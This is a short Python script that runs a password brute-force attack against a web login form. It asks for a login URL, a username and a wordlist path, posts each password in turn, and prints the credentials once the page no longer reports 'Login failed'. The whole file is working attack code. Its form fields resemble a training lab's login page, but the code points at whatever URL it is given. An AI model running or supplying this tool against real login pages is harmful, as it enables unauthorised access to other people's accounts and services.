#!/usr/bin/python3

import os
import requests
import colorama

from colorama import Fore

colorama.init(autoreset=True)

def bruteforce(username, login_url):
    for password in passwords:
        password = password.strip()

        data_dictionary = {"username":username, "password":password, "Login":"submit"}
        response = requests.post(login_url, data=data_dictionary)

        if "Login failed" in response.content.decode():
            print(f"{Fore.RED}[-] Incorrect Password: {Fore.LIGHTYELLOW_EX + password}")
        else:
            print(f"{Fore.LIGHTGREEN_EX}[+] Credentials found ---> Username/Email: {Fore.LIGHTYELLOW_EX + username}{Fore.LIGHTGREEN_EX} :: Password: {Fore.LIGHTYELLOW_EX + password}")
            exit()

login_page = str(input(Fore.LIGHTGREEN_EX + "[+] Login Page: " + Fore.LIGHTYELLOW_EX))
username = str(input(Fore.LIGHTGREEN_EX + "[+] Username/E-mail: " + Fore.LIGHTYELLOW_EX))


password_file = str(input(Fore.LIGHTGREEN_EX + "[+] Path to Password File: " + Fore.LIGHTYELLOW_EX))

if os.path.exists(password_file) == False:
    print("[-] Unable to locate the file/path")

print(f"\n{Fore.LIGHTGREEN_EX}[+] Starting the bruteforce attack on {Fore.LIGHTYELLOW_EX + login_page}{Fore.LIGHTGREEN_EX}...")
print("\n")

with open(password_file, "r") as passwords:
        bruteforce(username, login_page)

